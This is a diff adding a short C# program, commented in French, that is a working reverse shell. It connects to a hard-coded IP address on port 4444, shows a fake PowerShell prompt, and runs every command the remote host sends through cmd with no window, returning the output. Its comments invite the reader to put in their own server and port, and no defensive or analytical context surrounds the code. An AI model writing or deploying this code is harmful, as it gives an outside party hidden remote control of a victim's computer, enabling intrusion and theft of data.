@@ -1,0 +1,72 @@
+using System;
+using System.IO;
+using System.Net.Sockets;
+
+class Program
+{
+    static void Main(string[] args)
+    {
+        try
+        {
+            // Adresse et port du serveur distant
+            string server = "172.28.137.218";  // Remplacez par l'adresse de votre serveur
+            int port = 4444;  // Remplacez par le port que vous utilisez
+
+            // Connexion au serveur distant via TCP
+            TcpClient client = new TcpClient(server, port);
+            NetworkStream stream = client.GetStream();
+            StreamWriter writer = new StreamWriter(stream);
+            StreamReader reader = new StreamReader(stream);
+            writer.AutoFlush = true;
+
+            // Boucle infinie pour envoyer/recevoir des commandes
+            while (true)
+            {
+                writer.Write("PS > ");
+                string command = reader.ReadLine();
+
+                if (command == "exit") 
+                    break;
+
+                try
+                {
+                    // Exécuter la commande reçue via Invoke-Expression en PowerShell
+                    var result = ExecuteCommand(command);
+                    writer.WriteLine(result);
+                }
+                catch (Exception ex)
+                {
+                    writer.WriteLine(ex.Message);
+                }
+            }
+
+            // Fermer la connexion lorsque la boucle est terminée
+            client.Close();
+        }
+        catch (Exception ex)
+        {
+            Console.WriteLine($"Erreur : {ex.Message}");
+        }
+    }
+
+    static string ExecuteCommand(string command)
+    {
+        try
+        {
+            // Exécuter la commande et récupérer la sortie
+            System.Diagnostics.ProcessStartInfo procStartInfo = new System.Diagnostics.ProcessStartInfo("cmd", "/c " + command);
+            procStartInfo.RedirectStandardOutput = true;
+            procStartInfo.UseShellExecute = false;
+            procStartInfo.CreateNoWindow = true;
+
+            System.Diagnostics.Process process = System.Diagnostics.Process.Start(procStartInfo);
+            StreamReader reader = process.StandardOutput;
+
+            return reader.ReadToEnd();
+        }
+        catch (Exception ex)
+        {
+            return ex.Message;
+        }
+    }
+}
